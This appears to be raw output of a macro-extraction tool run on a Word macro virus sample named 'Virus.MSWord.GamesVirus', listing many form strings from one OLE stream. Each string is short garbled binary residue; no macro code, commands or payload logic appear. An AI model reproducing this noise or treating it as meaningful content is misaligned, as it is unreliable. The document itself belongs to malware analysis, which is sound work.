1I)Ji)Ja2RqMk�Dcy*Ri BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y(Ba(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba BY)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q2Rq'9Y)Ji3Zy3Zq)Ja1Ji BY2Rq'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I2Rq(Ba2Rq2Rq Ba)Ja2Ri)Ji<c� Ba'9Q(BY(Ba)Ji2Rq:Ra1Jq2Ri)Ja)Ja Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! -)($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y2RY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q Ba!Ji,cy3Zq*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY!Ji(Ba!Ja Ba Ba<cq<c� Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)IEk�Vs�;Zq Ba*Ri)Ji'9Q;Zy+Zq3Zy*Ri Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q"Ri)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY3Zy;Zy BY"Ri*RqUk�>s�+Zy Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY2Rq3Zy*Ri Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BaEk�Dc�<c�Ek�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BQ3Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q*Rq!Ja*Ri2Ry
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba BY Bi Ba)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba)Ji(BQ2Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y3Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY3ZqUky
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I*Ri"Rq!Ja2Rq!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q&1Y BY BY*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY/9Y:Ri3Zy2Ry+Zy*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q=k�)Ji Ba!Ja"Ri Ba=k�*Ri<c�Ek�!Ja'9Y)Ja(Ba(Ba BY BY)Ji)Ji2Rq(Bi BY2Rq)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I'9QEk�2Rq)Ji)Ja(Ba3Zq2Rq)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I2Rq2Ri<c�)Ja2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(Ba3Zq)Ji)Ji)Ja(Ba)Ja(Ba'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! 610
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%) $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$!($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*Ri2Ri)Ja1Jq)JqBRy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Y BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q BY'9i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY0Bq*Ri&1a Ba3Zy/9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(Ba3Zi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q3Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY3Zy;Zy'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9YCZy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q)Ji1Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ji3Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q1JiBRi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba2Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Bi BY)JaO{�Ns� BY Bi79i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Ja(BY<c�1Ji1Jq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JY*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja;Zy4cq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY3Zy:Ri)Ja2Rq BY)Jq BY'9YDcy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY Bi*RqNs�*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q'9Y!Ja*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q%)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y1Ji)Ja<cq2Rq!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY)Ji BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q2Rq2Ri3Zq3Zy)Ja BY(BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)Ji3Zq2Rq1Ji)Ji)Ji BY(BY2Rq Ba<cy3Zy2Ri1Ji(BY BY)Ji(Ba Ba1Ji;Zy)Ji(Ba)Ji1Ji<c�'9Y1Ji(BY(BY)Ji Ba&1Q'9Y)Ji(Ba;Zy2Ri1Ji'9Y)Ji1Ji(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $! $!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AJI-)(	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $! %)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q Bi*Rq!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y<cqDcy"Rq>s�2Rq*Ra)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji=k�*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y)Ji+Zq*Rq)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I)Ji'9Y2Rq1Ji3Zy3Zq3Zy Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Y!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rq BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba;Z�<c�Uk�3Zq3Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I&1Q*Ri)Ji*Rq3Zy3Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q(Ba)Ja Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I)Ja Ba*Ri2Ri#Zq+Zq3ZyMk�=ky)Ja)JY(BY'9Q"Rq3Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY!Ji

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY!Ja!Ja3Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q)Ji3Zq,cy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q&1QMky4c�*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y Ba)Jq#Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ji%)Q BY(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY:Rq3Zy:Ri*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y+Zq*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JY Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba!Ji"Ri)Jq+Zq+ZqFs�*Rq4cyEk�Ek�W{�Ek�3Zy*Rq2Rq$cy<c�+ZqNs�3Zy!Ji BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja Ba3Zy2Rq2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q3Zq&1I*Rq)Ja2Rq*Ri)Ji)Ji*Ri BY*Ri)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY1Ji2Rq)Ji Ba(Ba2Ri)Ja)Ji'9Q'9Q BY(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y(BY)Ji1Ji2Rq*Ri)Ja)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I BY(BY'9Q BY BQ2Ri)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I2Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%) $! #
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  BY(Ba*Ra
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY)Ji(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q)Ji(BY BY)Ji)Ja BY)Jq Ba'9Q3Zy)Ja3Zy*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q2Rq2Rq3Zq1Ji*Ri BY2Rq BY BY)Ji)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba*Ri*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1IDc�<c�3Zq BY'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Bi!Ji)Ji)JiCZ�!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q BQ BQ2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y!Ja*Ri(BY'9Y2Rq'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BQ BQ0Bap��CZ�)Ji(Ba;Zy)Ji)Ji)Ji*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ji)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Bi3Zy*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y)Ji!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ji*Rq BY*RiDc�Ek�"Ri BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q Ba)Ji3Zy5ky+Zq!Ji*Rq!Ja+Zq2Rq+Zq*Ry
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
